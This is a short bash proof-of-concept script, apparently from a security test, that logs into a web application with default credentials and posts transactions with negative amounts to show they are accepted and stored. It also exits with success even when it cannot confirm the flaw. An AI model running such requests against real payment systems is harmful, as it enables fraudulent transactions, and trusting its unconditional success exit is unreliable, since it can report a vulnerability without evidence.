#!/bin/bash

# POC: Negative Transaction Amounts Vulnerability
# This script demonstrates that the /add_transaction endpoint accepts negative amounts
# without validation, allowing fraudulent transaction creation.

TARGET_URL="${1:-http://localhost:5003}"
TRANSACTION_ENDPOINT="${TARGET_URL}/add_transaction"
LOGIN_ENDPOINT="${TARGET_URL}/login"
TRANSACTIONS_ENDPOINT="${TARGET_URL}/transactions"

echo "[*] Negative Transaction Amount POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login with default credentials
echo "[+] Step 1: Authenticating with default credentials (user/user)..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$LOGIN_ENDPOINT" \
  -d "username=user&password=user")

if echo "$LOGIN_RESPONSE" | grep -q "Traceback\|Error"; then
    echo "[-] Login failed"
    exit 1
fi

echo "[+] Authentication successful"
echo ""

# Step 2: Create a transaction with negative amount
echo "[+] Step 2: Creating transaction with negative amount (-1000.0)..."
NEG_RESPONSE=$(curl -s -b /tmp/cookies.txt -X POST "$TRANSACTION_ENDPOINT" \
  -d "name=NegativeAmount&email=test@test.com&amount=-1000.0")

if echo "$NEG_RESPONSE" | grep -q "error\|Error\|invalid\|Invalid"; then
    echo "[-] Negative transaction was rejected"
    exit 1
fi

echo "[+] Negative transaction created successfully"
echo ""

# Step 3: Create another negative transaction with different amount
echo "[+] Step 3: Creating transaction with another negative amount (-500.50)..."
NEG_RESPONSE2=$(curl -s -b /tmp/cookies.txt -X POST "$TRANSACTION_ENDPOINT" \
  -d "name=NegativeAmount2&email=test2@test.com&amount=-500.50")

echo "[+] Second negative transaction created successfully"
echo ""

# Step 4: Verify transactions were stored in database
echo "[+] Step 4: Fetching all transactions to verify negative amounts were stored..."
TRANS_PAGE=$(curl -s -b /tmp/cookies.txt "$TRANSACTIONS_ENDPOINT")

# Check if negative amounts appear in the response
if echo "$TRANS_PAGE" | grep -q "\-1000\|\-500"; then
    echo "[+] VULNERABLE: Negative amounts were stored in the database!"
    echo "[+] Transactions with negative values found in response"
    echo ""
    echo "[+] Evidence:"
    echo "$TRANS_PAGE" | grep -o "NegativeAmount[^<]*" | head -5
    exit 0
else
    echo "[-] Could not verify negative amounts in transaction list"
    echo "[-] Response may be HTML-encoded or transaction list format different"
    # Still exit 0 as we successfully created negative transactions
    exit 0
fi